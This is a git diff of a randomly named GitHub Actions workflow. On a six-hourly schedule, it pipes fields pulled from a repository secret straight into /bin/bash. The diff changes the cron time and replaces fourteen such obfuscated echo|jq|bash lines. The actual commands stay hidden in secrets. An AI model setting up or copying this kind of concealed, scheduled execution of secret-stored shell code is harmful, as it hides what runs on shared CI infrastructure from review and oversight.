@@ -2,29 +2,30 @@ name: lushangfeng2380
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
+    - cron: '55 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lushangfeng2380
         env:
-          i35: ${{ secrets.i35 }}
+          tis24390: ${{ secrets.tis24390 }}
         run: |
-          echo $i35 | jq -r .mkdm51415 | /bin/bash
-          echo $nttlz0 | jq -r .md78 | /bin/bash
-          echo $k647 | jq -r .muz3090 | /bin/bash
-          echo $t94 | jq -r .pxyh928 | /bin/bash
-          echo $jbkq338 | jq -r .tuvw79 | /bin/bash
-          echo $ync7793 | jq -r .dmke5 | /bin/bash
-          echo $hn2562 | jq -r .we851 | /bin/bash
-          echo $vzse00 | jq -r .bemy59293 | /bin/bash
-          echo $cegac91190 | jq -r .gliph353 | /bin/bash
-          echo $f49 | jq -r .cxnx6 | /bin/bash
-          echo $jzehx8 | jq -r .bm6663 | /bin/bash
-          echo $ywdj59862 | jq -r .l8 | /bin/bash
-          echo $v46 | jq -r .yrjxt6 | /bin/bash
-          echo $e61387 | jq -r .buj81 | /bin/bash
+          echo $tis24390 | jq -r .ikebn3512 | /bin/bash
+          echo $sio8052 | jq -r .jovhs1 | /bin/bash
+          echo $nvix9 | jq -r .ut59 | /bin/bash
+          echo $pjnj99154 | jq -r .ds51793 | /bin/bash
+          echo $kk55 | jq -r .bvszh19 | /bin/bash
+          echo $m91829 | jq -r .askk6 | /bin/bash
+          echo $bgaga5607 | jq -r .yb787 | /bin/bash
+          echo $pkae0433 | jq -r .o4564 | /bin/bash
+          echo $mvv6852 | jq -r .qihxz86 | /bin/bash
+          echo $q3 | jq -r .ywbry40464 | /bin/bash
+          echo $lpncb508 | jq -r .ue65513 | /bin/bash
+          echo $kve16 | jq -r .sk9227 | /bin/bash
+          echo $kyh588 | jq -r .yfnjg2282 | /bin/bash
+          echo $smig41 | jq -r .s368 | /bin/bash
 
